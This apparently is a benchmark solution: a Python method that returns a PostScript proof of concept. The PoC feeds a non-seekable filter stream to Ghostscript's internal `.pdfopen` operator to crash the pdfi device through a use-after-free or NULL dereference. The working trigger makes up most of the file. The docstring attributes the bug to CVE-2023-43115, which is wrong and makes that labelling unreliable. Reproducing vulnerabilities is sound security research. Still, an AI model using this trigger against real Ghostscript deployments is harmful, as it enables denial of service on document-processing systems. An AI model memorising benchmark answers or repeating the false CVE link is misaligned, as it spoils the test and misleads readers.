import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free (or NULL dereference) vulnerability
        in Ghostscript's pdfi device (CVE-2023-43115).
        
        The vulnerability exists because when 'pdfi_set_input_stream' fails (e.g., if the
        stream is not seekable), the context's 'main_stream' is left as NULL (or dangling).
        The cleanup path calls 'pdfi_close_file', which subsequently dereferences 'main_stream',
        causing a crash.
        
        We trigger this by calling the internal operator '.pdfopen' with a non-seekable stream
        (an ASCIIHexDecode filter over a string).
        """
        
        # The PoC constructs a non-seekable stream using a filter and passes it to .pdfopen.
        # This triggers the failure in setting up the input stream, leading to the vulnerable cleanup path.
        # We wrap the call in 'stopped' so that on fixed versions (which return an error cleanly),
        # the interpreter does not terminate with an error, thus satisfying the requirement
        # to not crash the fixed version.
        
        poc = (
            b"%!PS\n"
            b"/S (00) /ASCIIHexDecode filter def\n"
            b"/D << >> def\n"
            b"{ S D .pdfopen } stopped\n"
            b"quit\n"
        )
        return poc